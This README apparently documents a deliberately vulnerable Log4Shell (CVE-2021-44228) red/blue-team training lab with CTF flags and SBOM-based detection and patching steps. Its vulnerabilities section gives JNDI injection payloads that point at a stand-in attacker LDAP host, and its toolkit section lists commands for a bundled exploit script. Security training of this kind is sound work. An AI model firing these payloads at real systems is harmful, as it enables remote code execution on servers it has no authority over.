# 🎯 VULN-Log4Shell (Target Asset)

## 📖 Overview

**Service Type:** Multi-service enterprise environment (Auth, Inventory, Status)
**Language:** Java 11 / Spring Boot · Python 3.9 / Flask
**Status:** ⚠️ INTENTIONALLY VULNERABLE

This repository simulates a realistic enterprise environment where **two of three services use a vulnerable version of Log4j (2.14.1)**, exposing them to CVE-2021-44228 (Log4Shell). The third service runs Python and is not affected.

This scenario teaches:
- **Red Team:** How to detect and exploit Log4Shell via JNDI injection
- **Blue Team:** How SBOMs enable rapid identification of vulnerable dependencies

> ⚠️ **Training use only.** Run exclusively inside isolated lab environments.

---

## 🏗️ Architecture

| Service | Port | Language | Log4j | Vulnerable |
|---------|------|----------|-------|------------|
| Auth Service | 8001 | Java / Spring Boot | 2.14.1 | ✅ YES |
| Inventory Service | 8002 | Java / Spring Boot | 2.14.1 | ✅ YES |
| Status Service | 8003 | Python / Flask | None | ❌ NO |

### Why three services?
The scenario mirrors real-world environments where not every service shares the same dependencies. The Status Service (Python) is intentionally safe — demonstrating that **you cannot assume all services are vulnerable**. SBOMs are needed to determine exactly which services use Log4j.

---

## 🚀 Administrator Controls

| Command | Description |
|---------|-------------|
| `make setup` | Build all Docker images |
| `make up` | Start all three services |
| `make down` | Stop all services |
| `make reset` | **GAME STATE RESET** — wipe and rebuild from scratch |
| `make logs` | View service logs |
| `make test` | Run health checks on all services |

---

## 🚩 Flag Locations

| Flag | Location | How to Reach |
|------|----------|-------------|
| **Auth Flag** | `/flags/auth_flag.txt` in auth container | RCE via Log4Shell on `/login` username field |
| **Inventory Flag** | `/flags/inventory_flag.txt` in inventory container | RCE via Log4Shell on `/search?q=` parameter |

---

## 🛠️ Service Configuration

| Setting | Value |
|---------|-------|
| Auth Service | `http://localhost:8001` |
| Inventory Service | `http://localhost:8002` |
| Status Service | `http://localhost:8003` |

**Default Credentials (Auth Service):**
- Admin: `admin` / `admin`

---

## ⚠️ Known Vulnerabilities

### 1. Log4Shell — CVE-2021-44228 (Auth Service — port 8001)
**Where:** `POST /login` — `username` field is logged directly by Log4j without sanitization.

**Payload:**
```
{"username": "${jndi:ldap://attacker-ip:1389/exploit}", "password": "test"}
```

**How it works:**
1. Attacker sends JNDI lookup string as the username
2. Log4j processes the string and makes an outbound LDAP request to attacker's server
3. Attacker's LDAP server returns a malicious Java class
4. Java class executes arbitrary code on the target

---

### 2. Log4Shell — CVE-2021-44228 (Inventory Service — port 8002)
**Where:** `GET /search?q=` — search query is logged directly by Log4j.

**Payload:**
```
GET /search?q=${jndi:ldap://attacker-ip:1389/exploit}
```

---

### 3. Status Service — NOT Vulnerable
`GET /search?q=` on port 8003 accepts the same input but uses Python's standard logging library — no JNDI processing occurs.

---

## 🏹 Attacker Toolkit

The `tools/attack/` directory contains the exploit script:

```bash
# Terminal 1 — start JNDI canary listener
python3 tools/attack/log4shell_exploit.py --listen

# Terminal 2 — probe all services
python3 tools/attack/log4shell_exploit.py --probe

# Run full chain
python3 tools/attack/log4shell_exploit.py --all
```

---

## 🛡️ Blue Team — SBOM Defense

The Blue Team goal is to identify vulnerable services **before** the Red Team exploits them using Software Bill of Materials (SBOM).

### Generate SBOMs

```bash
# Install CycloneDX Maven plugin and generate SBOM for each Java service
cd services/auth-service
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom

cd services/inventory-service
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
```

### Search SBOMs for Log4j

```bash
# Search generated SBOM for Log4j
grep -r "log4j" services/*/target/bom.xml

# Look for vulnerable versions (< 2.17.1)
grep -A2 "log4j-core" services/*/target/bom.xml
```

### Patch

Update `pom.xml` in each vulnerable service — change Log4j version from `2.14.1` to `2.17.1`:

```xml
<!-- Before (VULNERABLE) -->
<version>2.14.1</version>

<!-- After (PATCHED) -->
<version>2.17.1</version>
```

Then rebuild:
```bash
make reset
```

### Mitigation without patching (Log4j 2.10+)

Set the JVM flag at startup to disable JNDI lookups:
```
-Dlog4j2.formatMsgNoLookups=true
```

Add to `Dockerfile` ENTRYPOINT:
```dockerfile
ENTRYPOINT ["java", "-Dlog4j2.formatMsgNoLookups=true", "-jar", "app.jar"]
```

---

## 📂 Repository Structure

| File / Directory | Purpose |
|-----------------|---------|
| `services/auth-service/` | Java Spring Boot auth app — Log4j 2.14.1 (vulnerable) |
| `services/inventory-service/` | Java Spring Boot inventory app — Log4j 2.14.1 (vulnerable) |
| `services/status-service/` | Python Flask status app — no Log4j (safe) |
| `docker-compose.yml` | Defines all three services |
| `flags/` | CTF flag files mounted into containers |
| `tools/attack/log4shell_exploit.py` | Red Team exploit script |
| `tools/test/test_services.sh` | Health check script |
| `Makefile` | Admin controls |
| `restore.sh` | Full reset logic |

---

## 🔗 References

- [CVE-2021-44228 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Advisory](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Log4Shell Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)
- [NTIA SBOM Resources](https://www.ntia.gov/sbom)

---

*For training only. Run in isolated lab environments only.*
